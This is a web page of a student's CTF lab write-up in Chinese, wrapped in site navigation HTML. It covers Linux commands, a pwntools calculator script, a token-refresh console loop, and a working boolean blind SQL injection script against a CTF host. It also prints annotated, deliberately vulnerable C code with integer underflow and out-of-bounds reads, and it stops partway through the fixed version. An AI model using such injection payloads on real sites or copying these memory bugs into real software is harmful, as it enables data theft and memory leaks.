+    <li class="md-nav__item">
+      <a href="../Lab%201%EF%BC%9AWeb/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web_Lab1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web基础知识
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Pwn/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pwn
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Lab%201%20Misc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Misc
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../rev%20lab%201/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Reverse
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_4" id="__nav_2_2_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lab 2
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Lab 2
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Crypto%20Lab%202/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Crypto
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Misc%20Lab%202/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Misc
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_5" id="__nav_2_2_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lab 3
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Lab 3
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Crypto%20Lab%203/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Crypto
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Misc%20Lab%203/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Misc
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../tools/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    工具
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../diaries/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    随笔
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#prerequisite" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Prerequisite
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Prerequisite">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#11-linux-基础命令" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1.1 Linux 基础命令
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#12-代码解读--pwn-初探" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1.2 代码解读 &amp; PWN 初探
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-lab-0" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Web Lab 0
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Web Lab 0">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#challenge-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Challenge 1
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Challenge 1">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#我的尝试" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        我的尝试
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#challenge-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Challenge 2
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Challenge 2">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#前置知识sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        前置知识：SQL
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#我的尝试布尔盲注脚本" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        我的尝试：布尔盲注脚本
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pwn-lab-0" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pwn Lab 0
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Pwn Lab 0">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#漏洞分析" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        漏洞分析
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#修复版" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        修复版
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reverse-lab-0" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reverse Lab 0
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Reverse Lab 0">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#实验环境" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实验环境
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#前置知识" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        前置知识
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#我的尝试_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        我的尝试
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="我的尝试">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#分析代码" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        分析代码
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ghidra-分析" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Ghidra 分析
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#逆向-verify-函数" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        逆向 verify 函数
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#密码还原" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        密码还原
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#crypto-lab-0" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Crypto Lab 0
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Crypto Lab 0">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#crypto-hack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Crypto Hack
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Crypto Hack">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#question-1-greatest-common-divisor" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Question 1: Greatest Common Divisor
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-2-extended-gcd" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Question 2: Extended GCD
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-3--4-modular-arithmetic" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Question 3 &amp; 4: Modular Arithmetic
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-5-modular-inverting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Question 5: Modular Inverting
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rsa-算法" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RSA 算法
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="RSA 算法">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-公钥与私钥的产生" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. 公钥与私钥的产生
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-加密消息" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. 加密消息
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-解密消息" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. 解密消息
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-解码原理与证明" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. 解码原理与证明
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rsa-代码实现" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RSA 代码实现
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lab-0-rsa-题目解答" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lab 0 RSA 题目解答
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#misc-lab-0" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Misc Lab 0
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Misc Lab 0">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#base-系列编码" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Base 系列编码
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Base 系列编码">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#什么是-base-系列编码" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        什么是 Base 系列编码？
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#核心分类" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        核心分类
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#核心原理以-base64-为例" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        核心原理（以 Base64 为例）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#challenge-1-解题" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Challenge 1 解题
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lsb-隐写--文件附加隐写" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LSB 隐写 &amp; 文件附加隐写
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="LSB 隐写 &amp; 文件附加隐写">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#challenge-2-解题" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Challenge 2 解题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lsb-隐写原理" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LSB 隐写原理
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#文件附加隐写" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        文件附加隐写
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="文件附加隐写">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#常见文件头尾" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        常见文件头/尾
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#提取方法" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        提取方法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+  
+    <a href="https://github.com/Jiuchengovo/Jiuchengovo.github.io/edit/master/docs/study/ctf/Crypto Lab 0.md" title="编辑此页" class="md-content__button md-icon" rel="edit">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4zm10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1z"/></svg>
+    </a>
+  
+  
+
+
+
+
+
+<h1 id="lab-0">Lab 0<a class="headerlink" href="#lab-0" title="Permanent link">&para;</a></h1>
+<h2 id="prerequisite">Prerequisite<a class="headerlink" href="#prerequisite" title="Permanent link">&para;</a></h2>
+<h3 id="11-linux-基础命令">1.1 Linux 基础命令<a class="headerlink" href="#11-linux-基础命令" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong><code>pwd</code></strong>: 打印当前所在的绝对路径，确认当前所处位置</li>
+</ul>
+<p><img alt="" src="../form-image.png" /></p>
+<ul>
+<li><strong><code>ls</code></strong>: 查看当前目录下的文件和子目录<ul>
+<li><code>ls</code>：简单列表</li>
+<li><code>ls -l</code>：详细列表（权限、大小、时间等）</li>
+<li><code>ls -a</code>: 列出所有文件和目录，包括隐藏文件</li>
+</ul>
+</li>
+</ul>
+<p><img alt="" src="../form-image-1.png" /></p>
+<ul>
+<li><strong><code>touch</code></strong>: 创建一个文件</li>
+</ul>
+<p><img alt="" src="../form-image-2.png" /></p>
+<ul>
+<li><strong><code>cat</code></strong>: 连接文件并输出到标准输出（通常用于查看短文件内容或合并文件）<ul>
+<li><code>cat 文件名</code>：显示整个文件内容</li>
+<li><code>cat -n 文件名</code>：显示内容并带行号</li>
+<li><code>cat -b 文件名</code>：仅对非空行编号</li>
+</ul>
+</li>
+</ul>
+<p><img alt="" src="../form-image-3.png" /></p>
+<p><img alt="" src="../form-image-4.png" /></p>
+<ul>
+<li><strong>选做1：ssh连接到Linux环境</strong></li>
+</ul>
+<p><img alt="" src="../form-image-5.png" /></p>
+<ul>
+<li>
+<p><strong>选做2：题目 "Saint John" — what is writing to this log file?</strong></p>
+<ol>
+<li><code>tail -f /var/log/bad.log</code> 确认故障</li>
+<li><code>sudo lsof /var/log/bad.log</code> 列出打开的文件，确认PID</li>
+<li><code>sudo kill -9 590</code> 确认PID后终止进程即可</li>
+</ol>
+</li>
+</ul>
+<p><img alt="" src="../form-image-6.png" /></p>
+<h3 id="12-代码解读--pwn-初探">1.2 代码解读 &amp; PWN 初探<a class="headerlink" href="#12-代码解读--pwn-初探" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>任务1：代码解读</strong><ul>
+<li>先读取 <code>input</code> 输入的字符串并输出其长度</li>
+<li>再新建空字符串（动态语言特性），遇到小写/大写英文字符将其转换成大写/小写，其余字符保持原样写进新字符串</li>
+</ul>
+</li>
+</ul>
+<p><img alt="" src="../form-image-7.png" /></p>
+<ul>
+<li><strong>任务2：Calculator</strong></li>
+</ul>
+<blockquote>
+<p>根据服务器发来的数据调整接收格式有点折磨 ^_^</p>
+</blockquote>
+<pre class="highlight"><code class="language-python">from pwn import *
+# 连接到远程服务器
+p = remote("10.214.160.13", 11002)
+
+# 跳过欢迎信息
+for i in range(6):
+    print(p.recvline().decode(), end="")
+
+# 做10题
+for i in range(10):
+    # 读取直到 '='
+    data = p.recvuntil(b'=').decode()
+    lines = data.split("\n")
+    # [-1] 取列表的最后一行，即包含表达式的那一行
+    expr_line = lines[-1]
+    expr = expr_line.replace("=", "").strip()
+    ans = eval(expr)
+
+    # 向服务器发送答案
+    p.sendline(str(ans).encode())
+
+# 输出flag
+print(p.recvall().decode())</code></pre>
+<p><img alt="" src="../form-image-8.png" /></p>
+<h2 id="web-lab-0">Web Lab 0<a class="headerlink" href="#web-lab-0" title="Permanent link">&para;</a></h2>
+<h3 id="challenge-1">Challenge 1<a class="headerlink" href="#challenge-1" title="Permanent link">&para;</a></h3>
+<h4 id="我的尝试">我的尝试<a class="headerlink" href="#我的尝试" title="Permanent link">&para;</a></h4>
+<ol>
+<li>
+<p>按钮似乎与本题没有任何关系qwq</p>
+</li>
+<li>
+<p>用菜单打开开发者工具（F12和右键似乎被禁止掉了），在控制台里面进行交互</p>
+</li>
+</ol>
+<pre class="highlight"><code class="language-javascript">function getflag() {
+    fetch('/flag.php?token=7e1343977d707628')
+        .then(res =&gt; res.text())
+        .then(res =&gt; alert(res))
+}</code></pre>
+<ol start="3">
+<li>
+<p>代码分析 &amp; 我的思路</p>
+<ul>
+<li><code>res =&gt; res.text()</code> 等价于 <code>function(res) { return res.text() }</code>，这是箭头函数写法</li>
+<li>alert为弹窗显示</li>
+<li>在控制台里输入getflag(),就是带着token去请求<code>flag.php</code>之后累积次数（显示弹窗2/1337之类的）</li>
+<li>但是在我的实操中，注意到每次刷新之后第一次都能够正确累计次数，但第二次及以后都不行（显示wrong token）</li>
+<li>这可能说明token是一次性的，请求一次<code>flag.php</code>之后就会失效,刷新页面会自动更新token就行了</li>
+<li>所以我们要做的就是在脚本中刷新页面，获得新token，getflag()调用<code>flag.php</code></li>
+<li>实现代码如下</li>
+</ul>
+<pre class="highlight"><code class="language-javascript">(async () =&gt; {
+  for (let i = 0; i &lt; 1337; i++) {
+      // await = 等这个操作完成再往下走
+      let html = await (await fetch('/lab0.php')).text();   // 拿页面内容
+      let token = html.match(/token=([a-f0-9]+)/)[1];       // token
+
+      let result = await (await fetch('/flag.php?token=' + token)).text();
+      console.log(result);                                   // 打印结果
+  }
+})();</code></pre>
+</li>
+</ol>
+<p><img alt="" src="../image-19.png" /></p>
+<h3 id="challenge-2">Challenge 2<a class="headerlink" href="#challenge-2" title="Permanent link">&para;</a></h3>
+<h4 id="前置知识sql">前置知识：SQL<a class="headerlink" href="#前置知识sql" title="Permanent link">&para;</a></h4>
+<ol>
+<li>
+<p>SQL是和数据库对话的语言（Structured Query Language）</p>
+</li>
+<li>
+<p>举个例子</p>
+<table>
+<thead>
+<tr>
+<th>id</th>
+<th>name</th>
+<th>password</th>
+<th>flag</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>admin</td>
+<td>123456</td>
+<td>flag{abc}</td>
+</tr>
+<tr>
+<td>2</td>
+<td>guest</td>
+<td>000000</td>
+<td>null</td>
+</tr>
+</tbody>
+</table>
+<pre class="highlight"><code class="language-sql">SELECT password FROM users WHERE name = 'admin'</code></pre>
+<p>"把 name 是 admin 的那一行的 password 找出来"</p>
+</li>
+<li>
+<p>SQL 注入的原理：用户的输入被直接拼进 SQL 语句，没有进行检查。所以如果输的不是 admin，而是一句 SQL 代码，它也会照常执行</p>
+</li>
+<li>
+<p>常见的 SQL 注入方式</p>
+<ul>
+<li><strong>Union</strong>: <code>UNION SELECT</code>的作用是将两条<code>SELECT</code>语句的结果纵向拼接成一张表；如果在正常查询之后拼接自己的恶意查询，页面渲染时就会把数据暴露出来</li>
+<li><strong>布尔盲注</strong>：页面不直接显示数据，但对不同情况的响应不同。把数据逐一比对，每次用一个"True/False"的问题，根据页面反应判断答案</li>
+</ul>
+<blockquote>
+<p>布尔盲注就是我们这道题运用的方式</p>
+</blockquote>
+<ul>
+<li><strong>时间盲注</strong>：比较页面的不同响应时间</li>
+<li><strong>报错注入</strong>：利用数据库在执行某些函数时会把数据通过错误信息泄露出来</li>
+</ul>
+</li>
+</ol>
+<h4 id="我的尝试布尔盲注脚本">我的尝试：布尔盲注脚本<a class="headerlink" href="#我的尝试布尔盲注脚本" title="Permanent link">&para;</a></h4>
+<pre class="highlight"><code class="language-python">import requests
+
+url = 'https://f79c3b665ae6a8a33c277d82.http-ctf2.dasctf.com/'
+flag = ''
+
+# 可打印字符
+chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}-_!@#$%^&amp;*()+=.,;:\'"'
+
+for pos in range(1, 60):
+    found = False
+    for c in chars:
+        # 用strcmp: 相等返回0 → if(0,1,0)=0 → 1^0=1 → Hello
+        # strcmp(mid(flag,pos,1), 0x??)
+        hex_char = hex(ord(c))  # 0x??
+        payload = f"1^(if(strcmp(mid((select(flag)from(flag)),{pos},1),{hex_char}),1,0))"
+
+        try:
+            r = requests.post(url, data={'id': payload}, timeout=10)
+            if 'Hello' in r.text:
+                flag += c
+                print(f'[+] 第{pos}位: {c}  |  {flag}')
+                found = True
+                break
+        except Exception as e:
+            print(f'[-] 错误: {e}')
+
+    if not found:
+        print(f'[-] 第{pos}位未找到，flag可能结束')
+        break
+
+print(f'\n最终 flag: {flag}')</code></pre>
+<p><img alt="" src="../image-20.png" />
+<img alt="" src="../image-21.png" /></p>
+<h2 id="pwn-lab-0">Pwn Lab 0<a class="headerlink" href="#pwn-lab-0" title="Permanent link">&para;</a></h2>
+<h3 id="漏洞分析">漏洞分析<a class="headerlink" href="#漏洞分析" title="Permanent link">&para;</a></h3>
+<pre class="highlight"><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;stdbool.h&gt;
+
+struct hbpkt
+{
+    uint32_t size;
+    uint32_t timestamp;
+    uint32_t index;
+    uint32_t cred;
+    char data[];
+};
+
+struct hbpkt *get_heart_beat()
+{
+    // 定义缓冲区大小0x1000（4096字节），并将其初始化为全零。
+    uint8_t buffer[0x1000] = {0};
+    // 它尝试读取一个结构体hbpkt的大小（sizeof(struct hbpkt)）的字节数，并将其存储在buffer中。
+    // struct hbpkt的大小是固定的(16字节)
+    fread(buffer, sizeof(struct hbpkt), 1, stdin);
+    // tmp指针指向buffer数组的起始位置，并将其强制转换为struct hbpkt类型的指针。
+    struct hbpkt *tmp = (struct hbpkt *)buffer;
+
+    if (tmp-&gt;size &gt; 0x1000)
+        return NULL;
+
+    // 但是你tmp-&gt;size可以小于sizeof(struct hbpkt)！
+    // 出现了漏洞"整数下溢"，即tmp-&gt;size - sizeof(struct hbpkt)会变成一个非常大的数，
+    // 从而导致fread读取过多的数据，可能会覆盖缓冲区之外的内存，造成缓冲区溢出漏洞。
+    fread(tmp-&gt;data, tmp-&gt;size - sizeof(struct hbpkt), 1, stdin);
+
+    // strlen也有问题！strlen必须以'\0'结尾，否则会继续读取内存直到遇到'\0'，可能会导致越界访问。
+    uint32_t real_size = sizeof(struct hbpkt) + strlen(tmp-&gt;data);
+
+    struct hbpkt *res = malloc(real_size);
+
+    if (!res)
+        return NULL;
+    // real_size可能大于buffer实际有效数据长度。
+    // memcpy会从buffer继续向后读取栈上的内容，造成越界读取（Information Leak）。
+    memcpy(res, buffer, real_size);
+
+    res-&gt;index += 1;
+
+    return res;
+}
+
+int reply_heart_beat(struct hbpkt *pkt)
+{
+    int err;
+    int written;
+    // reply_heart_beat() 按照 pkt-&gt;size 输出数据，
+    // 而不是按照实际分配的 real_size 输出。
+    // 攻击者可以伪造一个较大的 size，从而把堆中的额外内容一起泄露。
+    if (pkt-&gt;size)
+    {
+        written = fwrite(pkt, 1, pkt-&gt;size, stdout);
+        fflush(stdout);
+    }
+
+    if (written == 0 || written != pkt-&gt;size)
+    {
+        err = -1;
+    }
+
+    return err;
+}
+
+int main()
+{
+    int err;
+    while (true)
+    {
+        struct hbpkt *p = get_heart_beat();
+        if (!p)
+            continue;
+
+        err = reply_heart_beat(p);
+
+        if (err)
+        {
+            free(p);
+            continue;
+        }
+    }
+}</code></pre>
+<p><strong>漏洞总结：</strong></p>
+<ul>
+<li><strong>漏洞1</strong>：没有检查 <code>size</code> 是否小于 <code>sizeof(struct hbpkt)</code>。当 <code>size &lt; 16</code> 时，<code>size - 16</code> 会发生无符号整数下溢，<code>fread</code> 会尝试读取一个极大的长度，从而导致栈缓冲区溢出。</li>
+<li><strong>漏洞2</strong>：<code>strlen</code> 要求 <code>data</code> 是 <code>'\0'</code> 结尾的字符串。这里 <code>data</code> 是 <code>fread</code> 读取的原始字节流，不保证包含 <code>'\0'</code>。<code>strlen</code> 可能越界读取 <code>buffer</code> 后面的栈内存。</li>
+<li><strong>漏洞3</strong>：<code>real_size</code> 来源于 <code>strlen</code>，而不是 <code>pkt-&gt;size</code>。<code>memcpy</code> 会按照 <code>real_size</code> 从 <code>buffer</code> 中复制数据，如果 <code>real_size</code> 超过 <code>buffer</code> 中的有效数据长度，就会越界读取栈内存。</li>
+<li><strong>漏洞4</strong>：<code>reply_heart_beat()</code> 按照 <code>pkt-&gt;size</code> 输出数据，而不是按照实际分配的 <code>real_size</code> 输出。攻击者可以伪造一个较大的 <code>size</code>，从而把堆中的额外内容一起泄露。</li>
+</ul>
+<h3 id="修复版">修复版<a class="headerlink" href="#修复版" title="Permanent link">&para;</a></h3>
+<pre class="highlight"><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;stdbool.h&gt;
+
+struct hbpkt
+{
+    uint32_t size;
+    uint32_t timestamp;
+    uint32_t index;
+    uint32_t cred;
+    char data[];
+};
+
+struct hbpkt *get_heart_beat()
+{
+    uint8_t buffer[0x1000] = {0};
+
+    // 读取固定大小的包头部分
+    if (fread(buffer, sizeof(struct hbpkt), 1, stdin) != 1)
+        return NULL;
+
+    struct hbpkt *tmp = (struct hbpkt *)buffer;
+
+    // 修复1：检查 size 是否合法
+    // size 必须 &gt;= 包头大小，且 &lt;= 缓冲区总大小
